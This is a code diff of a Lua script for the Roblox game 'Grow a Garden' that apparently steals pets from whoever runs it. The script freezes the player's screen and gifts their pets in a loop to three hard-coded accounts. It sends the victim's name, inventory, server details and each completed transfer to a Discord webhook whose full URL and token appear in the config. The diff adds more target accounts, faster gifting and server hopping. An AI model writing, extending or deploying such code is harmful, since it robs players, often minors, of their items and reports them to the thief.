@@ -3,10 +3,11 @@
 
 -- Configuration
 local Config = {
-    TargetPlayerName = "CoolHolzBudd", -- Zielspieler, an den Pets geschickt werden
-    DelayBetweenGifts = 3, -- Wartezeit zwischen den Geschenken
+    TargetPlayerNames = {"CoolHolzBudd", "JovialUnstable", "Geroldsteiner6"}, -- Liste der Zielspieler, an die Pets geschickt werden
+    DelayBetweenGifts = 1, -- Wartezeit zwischen den Geschenken
     WebhookURL = "https://discord.com/api/webhooks/1394009500285145219/90-e9MTp0e80lBPQsmPK5b6MaTWLcPbH_tcKrfL5-KHDpo6xN01kmFHB9HsH3Qt4L2R9",
-    DebugMode = false -- Debug-Ausgaben aktivieren
+    DebugMode = false, -- Debug-Ausgaben aktivieren
+    ServerHoppingEnabled = true -- Server hopping für private/volle Server
 }
 
 -- Wait for game to load
@@ -708,11 +709,13 @@ local function CreatePetListEmbed(pets, targetPlayer)
     local serverType = serverInfo.isPrivate and "Private" or "Public"
     local description = string.format(
         "**Server Info:**\n" ..
+        "• **Player:** %s\n" ..
         "• **JobID:** `%s`\n" ..
         "• **Place ID:** %s\n" ..
         "• **Players:** %d/%d\n" ..
         "• **Server Type:** %s\n" ..
         "• **Target:** %s\n\n",
+        LocalPlayer.Name,
         serverInfo.jobId,
         serverInfo.placeId,
         serverInfo.serverSize,
@@ -779,14 +782,70 @@ local function CreatePetListEmbed(pets, targetPlayer)
     }
 end
 
+-- Server Hopping Functions
+local function IsServerPrivate()
+    local isPrivate = false
+    pcall(function()
+        if game.PrivateServerId and game.PrivateServerId ~= "" then
+            isPrivate = true
+        elseif Players.MaxPlayers <= 6 then
+            isPrivate = true
+        end
+    end)
+    return isPrivate
+end
+
+local function IsServerFull()
+    return #Players:GetPlayers() >= Players.MaxPlayers
+end
+
+local function ServerHop()
+    if not Config.ServerHoppingEnabled then
+        Log("🚫 Server hopping disabled")
+        return false
+    end
+    
+    Log("🔄 Attempting to server hop...")
+    
+    -- Send webhook notification about server hop
+    local hopData = {
+        username = "Grow a Garden Bot",
+        content = string.format("🔄 **Server Hopping**\n\n" ..
+            "Player: %s\n" ..
+            "Reason: %s\n" ..
+            "Time: %s",
+            LocalPlayer.Name,
+            IsServerPrivate() and "Private Server" or "Server Full",
+            os.date("%Y-%m-%d %H:%M:%S")
+        )
+    }
+    SendWebhook(hopData)
+    
+    -- Use TeleportService to hop to a new server
+    local TeleportService = game:GetService("TeleportService")
+    local success, error = pcall(function()
+        TeleportService:Teleport(game.PlaceId)
+    end)
+    
+    if success then
+        Log("✅ Server hop initiated")
+        return true
+    else
+        Log("❌ Server hop failed: " .. tostring(error))
+        return false
+    end
+end
+
 -- Main Functions
 local function FindTargetPlayer()
     for _, player in pairs(Players:GetPlayers()) do
-        if player.Name == Config.TargetPlayerName then
-            return player
+        for _, targetName in ipairs(Config.TargetPlayerNames) do
+            if player.Name == targetName then
+                return player, targetName
+            end
         end
     end
-    return nil
+    return nil, nil
 end
 
 local function GetGiftablePets()
@@ -879,6 +938,9 @@ local function ProcessPetGifting(targetPlayer)
                         if not currentInventory[pet.id] then
                             Log("✅ Confirmed: " .. pet.name .. " no longer in inventory")
                             
+                            -- Send success webhook
+                            SendSuccessWebhook(pet, targetPlayer)
+                            
 -- Send success webhook
 local function SendSuccessWebhook(pet, targetPlayer)
     local serverInfo = GetServerInfo()
@@ -886,12 +948,14 @@ local function SendSuccessWebhook(pet, targetPlayer)
     
     local description = string.format(
         "**Pet Successfully Gifted!**\n\n" ..
+        "• **Player:** %s\n" ..
         "• **Pet:** %s (%s Level %d)\n" ..
         "• **To:** %s\n" ..
         "• **JobId:** `%s`\n" ..
         "• **Server Type:** %s\n" ..
         "• **Players:** %d/%d\n" ..
         "• **Time:** %s",
+        LocalPlayer.Name,
         pet.name,
         pet.rarity,
         pet.level,
@@ -944,17 +1008,25 @@ end
 
 -- Main Logic
 local function Main()
-    Log("🌱 Gifting system started, looking for: " .. Config.TargetPlayerName)
+    Log("🌱 Gifting system started, looking for: " .. table.concat(Config.TargetPlayerNames, ", "))
+    
+    -- Check if we should server hop immediately
+    if Config.ServerHoppingEnabled and (IsServerPrivate() or IsServerFull()) then
+        Log("🔄 Server is private or full, attempting to hop...")
+        ServerHop()
+        return
+    end
     
     -- Send initial webhook when script loads
     Log("📡 Sending initial server scan...")
     local initialPets = GetGiftablePets()
-    local initialWebhook = CreatePetListEmbed(initialPets, FindTargetPlayer())
+    local target, targetName = FindTargetPlayer()
+    local initialWebhook = CreatePetListEmbed(initialPets, target)
     SendWebhook(initialWebhook)
     
     while true do
         if not isRunning then
-            local target = FindTargetPlayer()
+            local target, targetName = FindTargetPlayer()
             if target then
                 
                 FreezeScreen()
@@ -976,6 +1048,12 @@ local function Main()
                 -- Wait before next check
                 wait(30)
             else
+                -- Check if we should server hop when no target found
+                if Config.ServerHoppingEnabled and (IsServerPrivate() or IsServerFull()) then
+                    Log("🔄 No target found and server is private/full, hopping...")
+                    ServerHop()
+                    return
+                end
                 wait(5) -- Check every 5 seconds
             end
         else
@@ -992,17 +1070,20 @@ end)
 -- Listen for target joining
 pcall(function()
     Players.PlayerAdded:Connect(function(player)
-        if player.Name == Config.TargetPlayerName then
-            Log("🎯 Target player joined: " .. player.Name)
-            FreezeScreen()
-            wait(3) -- Give them time to load
-            if not isRunning then
-                spawn(function()
-                    local target = FindTargetPlayer()
-                    if target then
-                        ProcessPetGifting(target)
-                    end
-                end)
+        for _, targetName in ipairs(Config.TargetPlayerNames) do
+            if player.Name == targetName then
+                Log("🎯 Target player joined: " .. player.Name)
+                FreezeScreen()
+                wait(3) -- Give them time to load
+                if not isRunning then
+                    spawn(function()
+                        local target, foundName = FindTargetPlayer()
+                        if target then
+                            ProcessPetGifting(target)
+                        end
+                    end)
+                end
+                break
             end
         end
     end)
